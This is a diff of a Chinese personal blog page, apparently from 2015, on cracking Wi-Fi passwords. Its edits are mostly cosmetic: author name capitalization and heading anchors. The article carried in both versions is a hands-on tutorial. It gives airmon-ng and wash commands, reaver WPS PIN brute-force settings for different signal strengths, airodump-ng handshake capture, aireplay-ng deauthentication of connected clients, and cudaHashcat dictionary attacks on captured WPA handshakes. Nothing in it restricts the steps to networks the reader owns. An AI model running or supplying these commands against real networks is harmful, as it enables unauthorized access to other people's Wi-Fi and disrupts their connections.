@@ -7,7 +7,7 @@
     <title>wifi密码破解 | A1exlism</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
-    <meta name="author" content="a1ex">
+    <meta name="author" content="A1ex">
     
 
     
@@ -31,6 +31,7 @@
 <meta name="twitter:description" content="WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng start wlan0
 出现process占用airmon-ng check           查看占用进程iwconfig                  查看网卡是否处于monitor状态sudo airmon-ng check kill 最直接的方法..所有占用的直接all kill
 查看wp">
+<meta name="twitter:image" content="http://csser.work/imgs/wifiCrack/wps1.png">
 <link rel="publisher" href="106896526077043222500">
 
     
@@ -41,7 +42,7 @@
     <link rel="apple-touch-icon" href="/img/a1exlism.jpg">
     <link rel="apple-touch-icon-precomposed" href="/img/a1exlism.jpg">
     
-    <link rel="stylesheet" href="/css/style.css" type="text/css">
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
   <body>
@@ -93,7 +94,7 @@
   </h1>
   <p class="article-author">By
        
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="a1ex" target="_blank" itemprop="author">a1ex</a>
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
 		
   <p class="article-time">
     <time datetime="2015-11-14T16:00:00.000Z" itemprop="datePublished"> 发表于 11-15-2015</time>
@@ -105,13 +106,13 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WPS破解"><span class="toc-number">1.</span> <span class="toc-text">WPS破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用网卡混杂模式(monitor)"><span class="toc-number">1.1.</span> <span class="toc-text">使用网卡混杂模式(monitor)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#出现process占用"><span class="toc-number">1.1.1.</span> <span class="toc-text">出现process占用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看wps"><span class="toc-number">1.2.</span> <span class="toc-text">查看wps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#破解"><span class="toc-number">1.3.</span> <span class="toc-text">破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#问题"><span class="toc-number">1.3.1.</span> <span class="toc-text">问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储文件"><span class="toc-number">1.4.</span> <span class="toc-text">存储文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重新上网"><span class="toc-number">1.5.</span> <span class="toc-text">重新上网</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于暴力破解"><span class="toc-number">2.</span> <span class="toc-text">关于暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#抓包"><span class="toc-number">2.1.</span> <span class="toc-text">抓包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跑包"><span class="toc-number">2.2.</span> <span class="toc-text">跑包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference:"><span class="toc-number">2.3.</span> <span class="toc-text">Reference:</span></a></li></ol></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WPS破解"><span class="toc-number">1.</span> <span class="toc-text">WPS破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用网卡混杂模式-monitor"><span class="toc-number">1.1.</span> <span class="toc-text">使用网卡混杂模式(monitor)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#出现process占用"><span class="toc-number">1.1.1.</span> <span class="toc-text">出现process占用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看wps"><span class="toc-number">1.2.</span> <span class="toc-text">查看wps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#破解"><span class="toc-number">1.3.</span> <span class="toc-text">破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#问题"><span class="toc-number">1.3.1.</span> <span class="toc-text">问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储文件"><span class="toc-number">1.4.</span> <span class="toc-text">存储文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重新上网"><span class="toc-number">1.5.</span> <span class="toc-text">重新上网</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于暴力破解"><span class="toc-number">2.</span> <span class="toc-text">关于暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#抓包"><span class="toc-number">2.1.</span> <span class="toc-text">抓包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跑包"><span class="toc-number">2.2.</span> <span class="toc-text">跑包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">2.3.</span> <span class="toc-text">Reference:</span></a></li></ol></li></ol>
 		
 		</div>
 		
-		<h2 id="WPS破解">WPS破解</h2><h3 id="使用网卡混杂模式(monitor)">使用网卡混杂模式(monitor)</h3><p>airmon-ng 查看网卡信息<br>airmon-ng start wlan0<br><img src="/imgs/wifiCrack/wps1.png" alt="1"></p>
-<h4 id="出现process占用">出现process占用</h4><p>airmon-ng check           查看占用进程<br>iwconfig                  查看网卡是否处于monitor状态<br>sudo airmon-ng check kill 最直接的方法..所有占用的直接all kill</p>
-<h3 id="查看wps">查看wps</h3><ol>
+		<h2 id="WPS破解"><a href="#WPS破解" class="headerlink" title="WPS破解"></a>WPS破解</h2><h3 id="使用网卡混杂模式-monitor"><a href="#使用网卡混杂模式-monitor" class="headerlink" title="使用网卡混杂模式(monitor)"></a>使用网卡混杂模式(monitor)</h3><p>airmon-ng 查看网卡信息<br>airmon-ng start wlan0<br><img src="/imgs/wifiCrack/wps1.png" alt="1"></p>
+<h4 id="出现process占用"><a href="#出现process占用" class="headerlink" title="出现process占用"></a>出现process占用</h4><p>airmon-ng check           查看占用进程<br>iwconfig                  查看网卡是否处于monitor状态<br>sudo airmon-ng check kill 最直接的方法..所有占用的直接all kill</p>
+<h3 id="查看wps"><a href="#查看wps" class="headerlink" title="查看wps"></a>查看wps</h3><ol>
 <li><blockquote>
 <p>sudo wash -i wlan0mon -C</p>
 </blockquote>
@@ -125,36 +126,36 @@
 </li>
 </ol>
 <p>54e.    有点为wps<br>(MB选项的54e.和54e已经不能判断wps了)<br><img src="/imgs/wifiCrack/wps3.png" alt="3"></p>
-<h3 id="破解">破解</h3><p>目标信号非常好: reaver -i mon0 -b MAC -a -S -vv -d0 -c 1<br>目标信号普通: reaver -i mon0 -b MAC -a -S -vv -d2 -t 5 -c 1<br>目标信号一般: reaver -i mon0 -b MAC -a -S -vv -d5 -c 1</p>
+<h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><p>目标信号非常好: reaver -i mon0 -b MAC -a -S -vv -d0 -c 1<br>目标信号普通: reaver -i mon0 -b MAC -a -S -vv -d2 -t 5 -c 1<br>目标信号一般: reaver -i mon0 -b MAC -a -S -vv -d5 -c 1</p>
 <p>-c    Channel信道 信道可从上面的airodump找出来</p>
 <p><img src="/imgs/wifiCrack/wps4.png" alt="4"></p>
 <p>一般PIN码大概要个12-24小时左右的时间233[如果有60S的防PIN功能]<br>中断重pin的话找到MAC.wpc放入<code>/etc/reaver/</code>或者直接加上-p 前四位pin码就能继续</p>
-<h4 id="问题">问题</h4><p>1.<br>   [+] Sending EAPOL START request<br>  [!] WARNING: Receive timeout occurred<br>  一般是信号太差<br>2.<br>    [!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking<br>    一般路由器的防PIN措施,还没碰到网上所说的300s….这个措施保证了PIN的可破解性</p>
+<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>1.<br>   [+] Sending EAPOL START request<br>  [!] WARNING: Receive timeout occurred<br>  一般是信号太差<br>2.<br>    [!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking<br>    一般路由器的防PIN措施,还没碰到网上所说的300s….这个措施保证了PIN的可破解性</p>
 <ol>
-<li><h3 id="存储文件">存储文件</h3><p>Version 1.5     ——/etc/reaver/MAC.wpc<br>Version 1.4     ——/usr/local/etc/reaver/MAC.wpc </p>
+<li><h3 id="存储文件"><a href="#存储文件" class="headerlink" title="存储文件"></a>存储文件</h3><p>Version 1.5     —-/etc/reaver/MAC.wpc<br>Version 1.4     —-/usr/local/etc/reaver/MAC.wpc </p>
 </li>
 </ol>
-<h3 id="重新上网">重新上网</h3><blockquote>
+<h3 id="重新上网"><a href="#重新上网" class="headerlink" title="重新上网"></a>重新上网</h3><blockquote>
 <p>service network-manager start</p>
 </blockquote>
-<h2 id="关于暴力破解">关于暴力破解</h2><h3 id="抓包">抓包</h3><blockquote>
+<h2 id="关于暴力破解"><a href="#关于暴力破解" class="headerlink" title="关于暴力破解"></a>关于暴力破解</h2><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><blockquote>
 <p><a href="http://www.secbox.cn/hacker/wireless/4877.html" target="_blank" rel="external">http://www.secbox.cn/hacker/wireless/4877.html</a></p>
 <ol>
-<li>airodump-ng -w freedom -c CH —bssid  mac地址 wlan0mon —ignore-negative-one<br>CH表示信道，信道是多少就填多少，freedom是一会抓握手包的文件名字，他会自动生成一个freedom.cap的文件，这个名字随便你们填什么</li>
-<li>重新开一个客户端输入命令：<br>aireplay-ng —deaut 10 -a 路由器mac -c 客户端mac wlan0mon —ignore-negative-one</li>
+<li>airodump-ng -w freedom -c CH –bssid  mac地址 wlan0mon –ignore-negative-one<br>CH表示信道，信道是多少就填多少，freedom是一会抓握手包的文件名字，他会自动生成一个freedom.cap的文件，这个名字随便你们填什么</li>
+<li>重新开一个客户端输入命令：<br>aireplay-ng –deaut 10 -a 路由器mac -c 客户端mac wlan0mon –ignore-negative-one</li>
 </ol>
 </blockquote>
-<h3 id="跑包">跑包</h3><p><code>cudaHashcat</code>, advanced password recovery #鉴于windows独立显卡的支持比较好,在windows平台工作非常棒,GPU跑包咻咻咻的快</p>
-<p>下面为常用参数<br>cudaHashcat64.exe —attack-mode 0<br>-m /—hash-type 2500<br>-a / —attack-mode 0<br>–segment-size 3036      内存缓存大小<br>–gpu-loops 1000           Gpu性能<br>–gpu-accel 160              负载优化<br>—increment —increment-min 8 —increment-max 10</p>
-<p>这个是实例 ——   .txt后缀都是密码包,关键还是要看弱密码的数据质量了=, =  跑几个G还是很快的</p>
+<h3 id="跑包"><a href="#跑包" class="headerlink" title="跑包"></a>跑包</h3><p><code>cudaHashcat</code>, advanced password recovery #鉴于windows独立显卡的支持比较好,在windows平台工作非常棒,GPU跑包咻咻咻的快</p>
+<p>下面为常用参数<br>cudaHashcat64.exe –attack-mode 0<br>-m /–hash-type 2500<br>-a / –attack-mode 0<br>–segment-size 3036      内存缓存大小<br>–gpu-loops 1000           Gpu性能<br>–gpu-accel 160              负载优化<br>–increment –increment-min 8 –increment-max 10</p>
+<p>这个是实例 —-   .txt后缀都是密码包,关键还是要看弱密码的数据质量了=, =  跑几个G还是很快的</p>
 <blockquote>
-<p>cudaHashcat64.exe —hash-type 2500 —attack-mode 0  samsing-01.hccap 2(1).txt 2(2).txt 2(3).txt 2(4).txt 2(5).txt 2(6).txt 2(7).txt 2(8).txt 2(9).txt 2(10).txt 2(11).txt 2(12).txt 2(13).txt 2(14).txt 2(15).txt 2(16).txt 2(17).txt 2(18).txt 2(19).txt 2(21).txt 2(22).txt 2(23).txt 2(24).txt 2(25).txt 2(26).txt 2(27).txt 2(28).txt 2(29).txt 2(30).txt 2(31).txt 2(32).txt</p>
+<p>cudaHashcat64.exe –hash-type 2500 –attack-mode 0  samsing-01.hccap 2(1).txt 2(2).txt 2(3).txt 2(4).txt 2(5).txt 2(6).txt 2(7).txt 2(8).txt 2(9).txt 2(10).txt 2(11).txt 2(12).txt 2(13).txt 2(14).txt 2(15).txt 2(16).txt 2(17).txt 2(18).txt 2(19).txt 2(21).txt 2(22).txt 2(23).txt 2(24).txt 2(25).txt 2(26).txt 2(27).txt 2(28).txt 2(29).txt 2(30).txt 2(31).txt 2(32).txt</p>
 </blockquote>
 <p>手册(manual)</p>
 <blockquote>
 <p>[hashcat-manual]<a href="https://hashcat.net/wiki/doku.php?id=hashcat" target="_blank" rel="external">https://hashcat.net/wiki/doku.php?id=hashcat</a></p>
 </blockquote>
-<h3 id="Reference:">Reference:</h3><p><a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank" rel="external">airmon-ng</a><br><a href="http://www.secbox.cn/hacker/wireless/4877.html" target="_blank" rel="external">secbox</a><br><a href="http://www.kali.org.cn/thread-17187-1-1.html" target="_blank" rel="external">kali.org</a><br><a href="http://unix.stackexchange.com/questions/162088/why-airmon-ng-does-not-create-a-monitoring-interface" target="_blank" rel="external">stackexchange</a><br><a href="http://www.freebuf.com/tools/75517.html" target="_blank" rel="external">Frebuf</a><br><a href="http://www.hackingtutorials.org/wifi-hacking-tutorials/pixie-dust-attack-wps-in-kali-linux-with-reaver/" target="_blank" rel="external">hackingtutorials</a><br><a href="http://netsecurity.51cto.com/art/201105/264844_all.htm" target="_blank" rel="external">51cto</a></p>
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h3><p><a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank" rel="external">airmon-ng</a><br><a href="http://www.secbox.cn/hacker/wireless/4877.html" target="_blank" rel="external">secbox</a><br><a href="http://www.kali.org.cn/thread-17187-1-1.html" target="_blank" rel="external">kali.org</a><br><a href="http://unix.stackexchange.com/questions/162088/why-airmon-ng-does-not-create-a-monitoring-interface" target="_blank" rel="external">stackexchange</a><br><a href="http://www.freebuf.com/tools/75517.html" target="_blank" rel="external">Frebuf</a><br><a href="http://www.hackingtutorials.org/wifi-hacking-tutorials/pixie-dust-attack-wps-in-kali-linux-with-reaver/" target="_blank" rel="external">hackingtutorials</a><br><a href="http://netsecurity.51cto.com/art/201105/264844_all.htm" target="_blank" rel="external">51cto</a></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -205,7 +206,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WPS破解"><span class="toc-number">1.</span> <span class="toc-text">WPS破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用网卡混杂模式(monitor)"><span class="toc-number">1.1.</span> <span class="toc-text">使用网卡混杂模式(monitor)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#出现process占用"><span class="toc-number">1.1.1.</span> <span class="toc-text">出现process占用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看wps"><span class="toc-number">1.2.</span> <span class="toc-text">查看wps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#破解"><span class="toc-number">1.3.</span> <span class="toc-text">破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#问题"><span class="toc-number">1.3.1.</span> <span class="toc-text">问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储文件"><span class="toc-number">1.4.</span> <span class="toc-text">存储文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重新上网"><span class="toc-number">1.5.</span> <span class="toc-text">重新上网</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于暴力破解"><span class="toc-number">2.</span> <span class="toc-text">关于暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#抓包"><span class="toc-number">2.1.</span> <span class="toc-text">抓包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跑包"><span class="toc-number">2.2.</span> <span class="toc-text">跑包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference:"><span class="toc-number">2.3.</span> <span class="toc-text">Reference:</span></a></li></ol></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WPS破解"><span class="toc-number">1.</span> <span class="toc-text">WPS破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用网卡混杂模式-monitor"><span class="toc-number">1.1.</span> <span class="toc-text">使用网卡混杂模式(monitor)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#出现process占用"><span class="toc-number">1.1.1.</span> <span class="toc-text">出现process占用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看wps"><span class="toc-number">1.2.</span> <span class="toc-text">查看wps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#破解"><span class="toc-number">1.3.</span> <span class="toc-text">破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#问题"><span class="toc-number">1.3.1.</span> <span class="toc-text">问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储文件"><span class="toc-number">1.4.</span> <span class="toc-text">存储文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重新上网"><span class="toc-number">1.5.</span> <span class="toc-text">重新上网</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于暴力破解"><span class="toc-number">2.</span> <span class="toc-text">关于暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#抓包"><span class="toc-number">2.1.</span> <span class="toc-text">抓包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跑包"><span class="toc-number">2.2.</span> <span class="toc-text">跑包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">2.3.</span> <span class="toc-text">Reference:</span></a></li></ol></li></ol>
  
   </div>
 
@@ -314,7 +315,7 @@
 		<p class="copyright">
 		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2016 
 		
-		<a href="/about" target="_blank" title="a1ex">a1ex</a>
+		<a href="/about" target="_blank" title="A1ex">A1ex</a>
 		
 		
 		</p>
